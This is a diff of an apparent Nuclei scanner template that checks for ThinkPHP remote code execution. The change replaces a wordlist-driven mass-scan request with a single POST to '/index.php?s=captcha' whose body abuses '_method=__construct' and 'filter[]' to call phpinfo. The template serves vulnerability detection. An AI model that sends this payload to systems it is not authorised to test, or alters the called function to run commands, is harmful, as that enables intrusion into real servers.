@@ -9,28 +9,24 @@ info:
   tags: thinkphp,rce
 
 requests:
-  - payloads:
-      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-    attack: sniper
-    threads: 100
+  - method: POST
+    path:
+      - "{{BaseURL}}/index.php?s=captcha"
 
-    raw:
-      - |
-        POST /index.php?s=captcha HTTP/1.1
-        Host: {{Subdomains}}
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
-        Accept-Encoding: gzip, deflate
-        Content-Type: application/x-www-form-urlencoded
-        Accept: */*
-        
-        _method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    body: "_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1"
+
     matchers-condition: and
     matchers:
       - type: word
         words:
           - "PHP Extension"
           - "PHP Version"
+          - "ThinkPHP"
         condition: and
+
       - type: status
         status:
           - 200
